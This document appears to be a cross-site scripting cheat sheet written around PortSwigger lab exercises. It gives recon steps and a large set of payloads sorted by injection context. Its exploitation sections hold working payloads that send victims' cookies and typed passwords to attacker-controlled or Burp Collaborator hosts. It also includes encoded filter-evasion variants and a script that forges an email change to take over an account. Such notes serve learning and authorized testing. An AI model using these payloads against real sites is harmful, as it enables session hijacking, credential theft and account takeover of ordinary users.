# Cross-site Scripting

## Summary

* [Recon for XSS](#recon)

* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

   * [XSS between HTML tags + DOM XSS](#xss-between-html-tags-and-dom-xss)
   
   * [XSS in HTML tag attributes](#xss-in-html-tag-attributes)
   
   * [XSS into JavaScript](#xss-into-javascript)
   
   * [XSS to Exploit Users](#xss-to-exploit-users)
 
   * [More Exploitation and Exfiltration Related Payloads](#more-exploitation-payloads-and-examples)

<br>

## Resources

* https://portswigger.net/web-security/cross-site-scripting

* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting

*  https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting

* https://owasp.org/www-community/attacks/xss/  

<br><br>

## Recon

### Identify Reflected XSS

* **Identify Reflections of User Input**

    * Submit a unique random alphanumeric String into every parameter in each request, one at a time, and identify which parameters the application is reflecting back

    * Also submit the random String on any headers that the application seems to be processing 

* **Testing Reflection to Introduce XSS**

    * Review the source code to identify all the locations where the unique String is reflected 

    * Each occurrence needs to be tested separately

    * Depending on the context of where the String is being reflected, determine how the String needs to be modified in order to cause execution of a script

    * Use a proof-of-concept alert box to confirm that the script is executing in your browser

<br>

### Identify Stored XSS

* **Identify & Test for Stored XSS**

    * Submit a unique random String in every input field on the application, review all the application’s functionality to see if there are any more instances where the String in displayed back to the browser.  User-controllable data entered in 1 location can end up being reflected in many other arbitrary locations and each appearance may have different protective filters.

    * Identify if there is any input validation or encoding on the reflected data and determine how it needs to be modified to cause an execution of code

    * If you have access to 2 accounts ( E.g., normal user & admin user ), check if the injected data from the normal user appears in any of the functionality that an admin user can see

    * Make sure to complete the entire process when testing inputs that require multiple requests to be completed before they are stored.  Such as registering a user, placing an order, etc.

    * Test file upload functionalities for Stored XSS

    * For reflected XSS, it is straight forward to identify which parameters are vulnerable, as each parameter is tested individually, and the response is analyzed for any appearances of the input.

    * For stored XSS, if the same data is included in every input field, then in may be difficult to determine which parameter is the one responsible for the appearance of the data on the application.  To avoid this issue, submit different test Strings for each parameter when probing for Stored XSS.  Example: test123comment, test123username, test123address, etc.

<br>

### Identify DOM XSS

* Use the Browser to test for DOM-based XSS, as this will cause all the client-side scripts to execute.

* After mapping out the application, review all JavaScript client-side scripts for any “sources” in which a user can potentially control.

    * [Common Sources](https://portswigger.net/web-security/dom-based#common-sources)


* Review the code to identify what is being done with the user-controllable data, and if it can be used to cause JavaScript execution.  Identify if the data is being passed to dangerous “sinks”.

    * [Dangerous Sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)


* Burp Suite built-in tool to test for DOM XSS:

    * [DOM Invader Tool](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

* Note: DOM XSS can be combined with either a Reflected/Stored XSS.  Any client-side protections can be bypassed using Burp Suite before the data is passed back to the vulnerable client-side script.


<br>

---
---

<br>

## Cheat Sheet

<br>

**Quick Note:**  (To bypass some restrictions the following can help.)

* Use eval() and String.fromCharCode() to encode full payload (Cyber Chef -> To Decimal -> Delimiter set to "Comma" -> Copy/Paste)

  ```javascript
  eval(String.fromCharCode(INSERT_PAYLOAD))
  ```
  
* Use window['document']['location']

  ```javascript
  window['document']['location'] = "https://2q9hxdl2.oastify.com/?test=" + document.domain + "test123"
  ```

<br>

### Cheat Sheets

* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

* https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

* https://gchq.github.io/CyberChef/


<br>

### Initial Probing

* Submit a test String to all the input fields one at a time and identify the context in which the data is being returned in the responses.  For Stored XSS, we can add the parameter name to the payload.  The below test strings will verify how the application responds to angle brackets, parenthesis, quotation marks, single quotes.

    * **Test Strings:**

```html
<>"'/\`
```
```html
Test123parameterName
```
```html
<u>Test123</u>
```
```html
<script>alert("Test123")</script>
```
```html
<script>alert('Test123')</script>
```

<br><br>

* **Depending on that context, the following payloads can be used to break out of the context and potentially execute XSS:**

<br>

## XSS between HTML tags and DOM XSS

### No encoding implemented on the injected data

* If injected input is not be validated or encoded, we can simply use the standard XSS payloads below:

```html
<script>alert(1)</script>
```
```html
<img src=x onerror=alert(1)>
```

<br>

### Tags are being encoded but not recursively

* The application may be encoding the injected tags, but not in a recursive way.  The \<test\> tag will be properly encoded and rendered as data, but the rest of the payload will be executed as code.

```html
<test> <img src=x onerror=alert(1)>
```

<br>

### Tags are blocked except for custom ones

* If the application is blocking some common tags, we can inject custom ones.  Portswigger cheat sheet can help to have a list to fuzz.

* We can use Burp Intruder to fuzz and check which tags and event handlers are allowed.

  * Example:  \<FUZZ\> , \<body FUZZ="test"\> 

```html
<input2 onmouseover=alert(1)>Test</input2>
```

```html
<body onresize="print()">
```

* Submit Payload to the Victim user using Exploit Server: (encode special characters)

```html
<script>
      location = 'https://your-lab-id.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

```javascript
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
```

* The first quotation mark that is in the payload and the angle brackets need to be encoded.
  
```javascript
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

<br>

### SVG markup payload

* Payload to try if the application is allowing to render \<svg\> tags, can be found on Portswigger XSS Cheat Sheet.

```html
<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
```

<br>

### Reflected XSS with event handlers and href attributes blocked

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

<br>

### DOM XSS – Input is within the .innerHTML() Sink

* If user-controllable source is passed to the .innerHTML() sink, then we can use an \<img\> tag, for example, to execute JavaScript.  The .innerHTML() property will not execute \<script\> tags.

```html
<img src=x onerror=alert(1)>
```

<br>

### DOM XSS - AngularJS Expression

* If the application is using Angular JS, try injecting the following payload to the input fields and see if the expression is getting processed –> {{2+2}} = 4

   * Example:  https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss

```javascript
{{ this.constructor.constructor('alert("foo")')() }}
```

```javascript
{{$on.constructor('alert(1)')()}}
```

<br>

### DOM XSS jQuery selector sink - hashchange event

   * Vulnerable code:

```javascript
<script>
   $(window).on('hashchange', function(){
      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
         if (post) post.get(0).scrollIntoView();
   });
</script>
```

   * Exploit:  In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire. 

```html
<iframe src="https://VULNERABLE-APPLICATION/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

<br><br>

## XSS in HTML tag attributes

### Input is within an HTML attribute

* When the injected input is reflected within an HTML attribute, we need to close out the existing attribute/tag and introduce a new tag to execute JavaScript.

    * Example:  \<img src="*user-input*" \>

```html
"><script>alert(1)</script>
```

<br>

### Angle brackets encoded but data is reflected in attribute

* This will break out of the current attribute and introduce a new one that can execute JavaScript.  The last quotation mark is needed to ensure the syntax of the tag is correct.

    * Example:  \<input value=“*user-input*”\>

```html
Test123" autofocus onfocus=alert(1) x=" 
```

<br>

### Input is within an href attribute

* The JavaScript pseudo protocol can be used when the data is being reflected within a href attribute.

    * Example:  \<a href="*user-input*" \>

```html
javascript:alert(1)
```

<br>

### Input is within a canonical link tag

* Example:   \<link rel="canonical" href='httpss://some-site.com/*user-input*' /\>

```html
' accesskey='x' onclick='alert(1)
```

<br><br>

## XSS into JavaScript

### JavaScript String with single quote and backslash escaped

* Use this payload to close the existing \<script\> tag and introduce a new tag that can execute JavaScript code.

    * Example:  \<script\> var x ='*user-input*'\</script\>

```html
</script><img src=x onerror=alert(1)>
```

<br>

### JavaScript String with angle brackets encoded

* This payload will terminate the existing String and close the statement, then comment out the rest of line.  Since the input is within \<script\> tags the payload will execute as JS.

    * Example:  \<script\> var x =’*user-input*’\</script\>

```html
'; alert(1) //
```

<br>

### JavaScript String with angle brackets, double quotes encoded, and single quotes escaped

* The escape character itself, is not escaped, so when we supply it in the payload the application will end up escaping the escape character, instead of the single quote.  Since the input is already within \<script\> tags, the alert() will execute.

    * Example:  \<script\> var x =’*user-input*’\</script\>

* **Payload**
```html
\'; alert(1)//
```

* **End-Result**
```html
\\';alert(1)//
```

* For exploitation payloads see the next Section on Exploitation Payloads.

<br><br>

### XSS is onclick event with angle brackets, double quotes encoded, and single/backslashes escaped

* Bypass server-side validation by submitting HTML entities.  The Browser will decode the HTML entities before the JavaScript is executed, which will break out of the context and execute the JavaScript.

* https://www.w3schools.com/html/html_entities.asp 

    * Example:  \<a onclick=”var x=z; x.y(‘http://*user-input*’);” \>


* **Identification Payloads:**

```
&apos; ) ; alert(1) ;//
```
```
&apos; -alert(1)- &apos; 
```

* **Exploitation Payloads:**

* In this scenario, the application is encoding tags/quotations and escaping single quotes/backslashes.

* We can bypass this by HTML encoding our payload:

* Original Payload: 

```javascript
') ; document.location = 'https://tjqojc8.oastify.com/?x=' + document.domain ; //
```

* HTML Encoded Payload: (If using Burp Suite, the payload itself will need to be URL encoded to process correctly.)

```javascript
&apos;) ; &#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x74;&#x6a;&#x67;&#x38;&#x75;&#x7a;&#x30;&#x71;&#x6f;&#x6a;&#x63;&#x38;&#x2e;&#x6f;&#x61;&#x73;&#x74;&#x69;&#x66;&#x79;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x3f;&#x78;&#x3d;&#x27;&#x20;&#x2b;&#x20;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e; ; //
```

<br><br>

### XSS into template literal `` 

* When the injected input is being reflected inside of backticks ` (template literals), we can execute expressions using the ${*data*} format. 

    * Example:  \<script\> var message=\`*user-input*\` \</script\>

```javascript
${alert(1)}
```

<br><br>

## XSS to Exploit Users

### Use XSS to steal user's cookies

* Inject the following payload in the vulnerable target application to steal a user's session cookie.  Here the "attacker server" could be burp collaborator for example.

```javascript
<script>
fetch('https://ATTACKER-SERVER', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
<br>

* We can inject that "fetch" function in any event handler that executes JavaScript, for example:

```javascript
<svg onload="fetch('https://277ebucws3h.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});"></svg>
```

```javascript
<style>@keyframes x{}</style>
<svg style="animation-name:x" onanimationend="fetch('https://yoqy8pwqkf.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.domain
});"></svg>
```

<br>

### Use XSS to capture passwords

* Inject the following payload in the vulnerable target application to steal a user's credentials.  Here the "attacker server" could be burp collaborator for example.


```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER-SERVER',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

<br>

### Use XSS to perform CSRF

* Inject the following payload in the vulnerable target application to force a user into changing their email address to test@test.com.  This can be combined with a "Forgot Password" function to take over a user's account.


```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

<br><br>

## More Exploitation Payloads and Examples

* Here below will be some more example payloads that were used for testing purposes to exfiltrate data, etc.  Particularly payloads that are not just using the alert(1) proof-of-concept.

<br>

* Vulnerable code:  Our payload is included into in eval() function.  The response type where our payload is reflected is in JSON body.

```javascript
if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
}
```


* Payload:  The application is escaping the quotations but not the backslash character.

```javascript
\"-alert(1)}//
```

* An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:

```javascript
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

* Using the above context, the following payload can be used to exfiltrate information: (Note: The random query parameter 'x' was included so that way the document cookie will correctly be included in the request sent to Burp Collaborator. This behavior is similar to a lab, where we used the Exploit Server to exfiltrate data.)

```javascript
\" - (document.location = 'https://xxxx.oastify.com/x?=' + document.cookie)}//
```


<br><br>

* Payload technique was constructed from the XSS cheat sheets.  This submits a request with user's cookie to Burp Collaborator.

```javascript
<script> window['document']['location'] = "https://xqr9xaoylma.oastify.com/?test1=" + document.cookie + "test1"; </script>
```

<br><br>

* Payload using the javascript protocol ( javascript:alert(1) )to send data over to server under our control.  The "document.domain" can be changed to "document.cookie", etc.  After testing this it is recommended to just URL encode the entire payload before submitting it. (Note: the ?test parameter used in the Burp Collaborator was required in order to process it correctly)

```javascript
javascript:window['document']['location'] = "https://2q9hxdl2.oastify.com/?test=" + document.domain + "test123"
```

<br><br>

* Context is within an HTML attribute and angle brackets are encoded:
    
    * Note:  Encoding the payload actually made it not work so it's good to try many things. The closing quotation is not included since one will be there with the current context.
      
```javascript
test123" onmouseover="document.location = 'https://xxx.oastify.com/?x=' + document.domain
```

<br><br>

* If the application is encoding angle brackets/double quotes and escaping single quotes, the below payloads can help bypass restrictions:

    * Steps:  Go to CyberChef and select "To Decimal" and set the Delimiter to "Comma".  Paste the payload results within the "String.fromCharCode()" function.

* Original Payload: (did not work as single quotes escaped, document.location did not work correctly)

    * Encode the payload and use it within the String.fromCharCode() function.

```javascript
\'; document.location =  "https://3imrz0nwbl.oastify.com/?x=" + document.domain + "END" ; //
```

* Final Payload(s):

```javascript
\'; eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,99,118,98,48,115,54,111,118,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)) ; //
```

* This payload executes the document.domain:
  
```javascript
\'; var x = String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110) ; alert(eval(x)) ; //
```



<br><br><br>

### Pending to complete labs that are missing from cheat sheet:

* LAB EXPERT Reflected XSS in a JavaScript URL with some characters blocked

* LAB EXPERT Reflected XSS with AngularJS sandbox escape without strings

* LAB EXPERT Reflected XSS with AngularJS sandbox escape and CSP

* LAB EXPERT Reflected XSS protected by very strict CSP, with dangling markup attack

* LAB EXPERT Reflected XSS protected by CSP, with CSP bypass
